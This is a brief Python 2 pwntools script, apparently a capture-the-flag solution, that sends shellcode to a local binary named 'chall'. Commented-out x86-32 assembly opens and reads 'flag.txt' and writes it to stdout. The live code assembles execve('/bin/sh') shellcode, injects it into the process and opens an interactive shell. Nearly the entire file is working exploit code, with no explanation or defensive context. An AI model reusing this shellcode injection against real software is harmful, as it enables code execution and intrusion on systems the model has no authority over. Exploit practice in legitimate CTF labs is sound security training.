#!/usr/bin/python2
#https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md #x86-32_bit
# payload = '''
# mov eax, 3 r
# mov ebx, 0 st
# lea ecx, [esp+0x100] 
# mov edx, 100 
# int 0x80  '''

# payload = '''
# mov eax, 5  
# push 0 
# push 0x7478742e  
# push 0x67616c66  
# mov ebx, esp  
# mov ecx, 0 
# mov edx, 0 
# int 0x80 
# '''

# # #read untuk file
# # payload = '''
# # mov ebx, eax
# # mov eax, 3 
# # lea ecx, [esp+0x100] 
# # mov edx, 100 
# # int 0x80 
# # '''
# #read
# payload = '''
# mov eax, 4 
# mov ebx, 1 
# lea ecx, [esp+0x100] 
# mov edx, 100 
# int 0x80 
# ''' #stdout

# #write
# payload = '''
# mov edx, eax 
# mov eax, 4 
# mov ebx, 1 
# lea ecx, [esp+0x100] 
# int 0x80 
# ''' #stdout
from pwn import *

p = process('./chall')
#bin sh
payload = shellcraft.execve("/bin/sh",0,0)
payload = shellcraft.sh()


payload = asm(payload)
p.sendline(payload)
p.interactive()
